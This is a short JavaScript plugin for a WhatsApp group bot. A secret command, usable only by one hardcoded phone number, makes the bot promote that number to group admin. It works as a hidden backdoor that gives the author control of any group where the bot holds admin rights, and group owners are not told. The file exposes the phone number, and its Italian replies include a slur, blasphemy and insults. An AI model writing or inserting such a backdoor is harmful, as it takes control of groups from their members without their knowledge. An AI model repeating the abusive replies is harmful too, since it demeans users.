let handler = async (m, { conn, isAdmin }) => {  
    // Numero autorizzato
    const numeroAutorizzato = '393204885371@s.whatsapp.net'; 


    // Verifica se l'utente che esegue il comando è il numero autorizzato
    if (m.sender !== numeroAutorizzato) {
        await conn.sendMessage(m.chat, { text: '' });
        return;
    }

    if (m.fromMe) return;
    if (isAdmin) throw '𝕾𝖊𝖎 𝖌𝖎à 𝖆𝖉𝖒𝖎𝖓 𝖕𝖆𝖉𝖗𝖔𝖓𝖊';

    try {  
        // Invia il messaggio prima di eseguire l'azione
        await conn.sendMessage(m.chat, { text: '𝕴𝖑 𝖕𝖔𝖙𝖊𝖗𝖊 𝖊 𝖑𝖆 𝖈𝖔𝖗𝖔𝖓𝖆 𝖘𝖔𝖓𝖔 𝖘𝖙𝖆𝖙𝖎 𝖉𝖆𝖙𝖎 𝖆 𝖘𝖔𝖑𝖔 𝖚𝖓𝖎𝖈𝖔 𝖉𝖎𝖔 𝖉𝖊𝖑 𝖌𝖗𝖚𝖕𝖕𝖔' });

        // Promuove l'utente a admin
        await conn.groupParticipantsUpdate(m.chat, [m.sender], "promote");
    } catch {
        await m.reply('𝕸𝖔𝖓𝖌𝖔𝖑𝖔𝖎𝖉𝖊, 𝖉𝖎𝖔 𝖈𝖆𝖓𝖊, 𝖓𝖔𝖓 𝖘𝖊𝖎 乇几ᗪㄚ 𝖕𝖔𝖗𝖈𝖆 𝖒𝖆𝖉𝖔𝖓𝖓𝖆');
    }
};

handler.command = /^乇几ᗪㄚ$/i;
handler.group = true;
handler.botAdmin = true;
export default handler;